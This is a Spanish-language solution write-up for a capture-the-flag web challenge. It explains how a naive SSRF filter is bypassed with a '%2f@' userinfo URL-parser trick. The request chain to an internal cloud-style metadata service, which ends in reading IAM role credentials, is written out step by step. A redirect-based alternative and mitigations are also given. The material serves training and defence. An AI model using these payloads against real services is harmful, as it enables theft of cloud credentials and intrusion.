# Solución — web-ssrf-02 · Metadata Mirage

**Categoría:** web · **Dificultad:** insane · **Vuln central:** SSRF ciego con bypass del filtro por **divergencia de parsers de URL** (userinfo `%2f@`) + endpoint de metadata interno simulado. Vuln secundaria: SSRF-via-redirect (TOCTOU).

## Resumen

PixelForge (importador de avatares) descarga una URL que tú le das y devuelve
metadatos del recurso. El filtro anti-SSRF bloquea `localhost`, `metadata`,
`127.0.0.1`, `169.254.169.254` y los rangos privados/loopback que logra parsear.
El objetivo es alcanzar el servicio de metadata interno
(`http://metadata:8080/`, en la red del equipo `172.30.{N}.13`) y leer las
credenciales del rol del nodo, cuyo campo `Token` es la flag.

## La vulnerabilidad

El filtro extrae el host de forma **ingenua**: toma "lo que va antes del `@`"
como host (asume que no hay userinfo). `requests`/urllib3, en cambio, tratan esa
parte como credenciales y se **conectan al host que va después del `@`**:

```
URL: http://images.trusted-cdn.example%2f@metadata:8080/latest/meta-data/
  filtro     ve host = "images.trusted-cdn.example%2f"   -> PERMITIDO
  requests   conecta a "metadata:8080"                    -> INTERNO
```

El `%2f` (slash codificado) evita que el parser del filtro corte antes de tiempo
y mantiene todo dentro de la sección de userinfo desde su punto de vista. La
petición sale entonces hacia el metadata interno.

> Camino alternativo (vuln secundaria): el host se valida ANTES de seguir
> redirects y el `Location` no se revalida. Si dispones de un host de confianza
> que puedas hacer responder 302 hacia `http://metadata:8080/...`, también
> llegas (SSRF-via-redirect / TOCTOU).

## Cadena de explotación

1. **Confirmar el filtro** (estos dan 403):
   ```
   POST /api/fetch {"url":"http://metadata:8080/latest/meta-data/"}
   POST /api/fetch {"url":"http://127.0.0.1/"}
   ```
2. **Bypass + enumerar el árbol de metadata**:
   ```
   POST /api/fetch {"url":"http://x%2f@metadata:8080/latest/meta-data/"}
   -> preview: "instance-id\niam/\nlocal-ipv4\nplacement/"
   ```
3. **Obtener el nombre del rol IAM**:
   ```
   .../latest/meta-data/iam/security-credentials/
   -> preview: "pixelforge-node-role"
   ```
4. **Leer las credenciales (la flag está en `Token`)**:
   ```
   .../latest/meta-data/iam/security-credentials/pixelforge-node-role
   -> {"Code":"Success", ..., "Token":"HL4{...}"}
   ```

El servicio de metadata entrega las credenciales **solo** a peticiones con el
User-Agent del fetcher (`PixelForge-Fetcher`), no a un navegador: refuerza que
hay que pasar por el SSRF, no acceder "directo".

Exploit automatizado: `solution/exploit.py http://<host>:8080`.

## Por qué es INSANE

- El bypass no es un truco de blocklist trivial: requiere entender que el filtro
  y la librería HTTP **parsean la URL de forma distinta** y abusar de esa
  divergencia con `%2f@`.
- Es **SSRF ciego**: solo recuperas metadatos/preview, hay que encadenar la
  enumeración del árbol de metadata (índice -> rol -> credenciales).
- El objetivo interno está aislado por red (no se publica al host) y la
  credencial está gateada por User-Agent.

## Mitigaciones (didáctico)

- Resolver el host con un parser robusto (`urllib.parse.urlsplit().hostname`) y
  validar **la IP resuelta**, no la cadena. Re-validar tras cada redirect.
- Allow-list de destinos + bloquear por IP resuelta (incl. link-local
  `169.254.0.0/16` y privadas) antes de conectar; deshabilitar redirects.
- El metadata del proveedor debe exigir token de sesión (IMDSv2), no servir
  credenciales a cualquier GET interno.

## Nota anti-cheat

La flag (campo `Token` del rol) es **dinámica y única por equipo** (HMAC del
flag-service, `ARCHITECTURE §4`), inyectada por env `FLAG` en ambas instancias
(portal y metadata) del equipo. El metadata interno **no se publica al host**:
solo es alcanzable atravesando el SSRF del portal del propio equipo. Compartir
la técnica no da puntos: cada equipo explota SU portal para SU flag; enviar la
de otro equipo dispara `cheat_flag_share` (`/whose-flag`). Los intentos de host
bloqueado y los aciertos contra el interno emiten eventos SIEM
(`scan_detected` warn/alert) al collector.
